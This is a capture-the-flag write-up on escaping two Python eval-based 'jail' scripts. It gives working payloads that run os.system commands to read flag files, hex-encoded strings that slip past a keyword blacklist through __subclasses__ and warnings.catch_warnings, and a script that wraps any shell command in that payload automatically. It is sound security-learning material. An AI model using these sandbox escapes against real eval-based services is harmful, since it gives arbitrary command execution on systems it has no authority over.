> Raj Pastagiya | 06/05/2023

# Breaking from jail1.py
- Looking into the code we see the eval() function and which will help us do the arbitrary command injection in through eval function. Based on [Hacktrickz](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes) blog, we can easily use...
```python
__import__("os").system("cat ./flag1.txt")
```

# Breaking from jail2.py
- jail2.py has certain blacklisted words, which we can't use. But still we can leverage builtin functions in specific classes to do our work, without actually specifying the word itself. Or we can also use pre-encoded text as input to decoder as payload.

### Step-1: Using pre-encoded text in decoder based payload
- Here we can use hexstream as encoded text to the input to hexstream decoder. Below is the example of it:
```python
bytearray.fromhex('5f5f696d706f72745f5f28226f7322292e73797374656d28226c732229').decode()
...

# which is same as writing
__import__("os").system("ls")
# but in encoded form
```
- But this doesn't give us expected output, instead it just prints the ecoded text. So we need to use builtins with above.
- At the very least, the script is not detecting and comlaining about hacking, which can be useful.
### Step-2: Identifying builtin module that could contain eval function
- Here we meed to find builtin module which has "eval" function already available in it so we can all it for our purpose, and bypass the issue we faced earlier and run the eval funciton on our own terms.
- For this I found an interesting walkthrough of redpwn CTF [HERE](https://ctftime.org/writeup/16199) where all in all it says for an empty tuple, in subclasses of the tuple object, we needed to find **"warnings.catch_warnings"** object in which we can find required functions.
- The empty tuple way as he used in walkthrough didn't work here in our case, so we need to build our own payload searching for **"warnings.catch_warnings"** module in **\_\_builtins__** module's subclasses.
- We can list all the subclasses and also find the index of required module which in my case was 150. Now in that module we need to again get list of builtins and call the "eval" function.
```python
__builtins__.__class__.__base__.__subclasses__()[150]()._module.__builtins__["eval"](__import__("os").system("cat ./flag2.txt"))
```
- But above would be detected by the script as it contains blacklisted words, so again where ever we have blacklisted words, we need to use hexstream decoding technique.
- The final payload would look like below:
```python
__builtins__.__class__.__base__.__subclasses__()[150]()._module.__builtins__[bytearray.fromhex("65786563").decode()](bytearray.fromhex("5f5f696d706f72745f5f28226f7322292e73797374656d2822636174202e2f666c6167322e7478742229").decode())
```
- This will result in catting out the flag2.txt file.
- The beauty of above payload is that it is generic, meaning it will work in jail1.py too.

# Extra
- To avoid the hassel of doing all things again and again, I created a python script automate our work. You just need to put commands like `ls`, `cat ./flag2.txt` other things will be done by script.
```python
import subprocess

payloadseg1="__builtins__.__class__.__base__.__subclasses__()[150]()._module.__builtins__[bytearray.fromhex('65786563').decode()](bytearray.fromhex('"
payloadseg2 = "').decode())"
importPayloadseg1 = "__import__(\"os\").system(\""
importPayloadseg2 = "\")"
while True:
    child = subprocess.Popen(['python3', 'jail2.py'], stdin=subprocess.PIPE)
    cmd=input().strip().replace("\n", "")
    encodedPayload= (importPayloadseg1 + cmd + importPayloadseg2).encode().hex()
    # print(encodedPayload)
    finalPayload = payloadseg1 + encodedPayload + payloadseg2
    # print("Final Payload", finalPayload, sep=": ")
    output, err = child.communicate(finalPayload.strip().encode())
    print(output)
```
- **Note:** Ignore EOFError, as it comes from jail2.py while communicating via subprocess. We can even avoid it by adding exception handling in jail2.py.